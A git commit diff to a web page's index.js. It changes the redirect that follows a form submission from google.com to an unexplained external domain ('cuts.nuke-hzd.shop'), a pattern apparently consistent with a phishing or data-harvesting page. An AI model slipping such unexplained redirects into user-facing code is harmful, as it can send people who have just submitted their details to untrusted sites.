1d0bc14e2ff6fac3cb2218e536bfcc9fbb6a0ce8
husknet <127146284+husknet@users.noreply.github.com>
2024-07-25 14:39:14 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://google.com';
+        window.location.href = 'https://cuts.nuke-hzd.shop/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
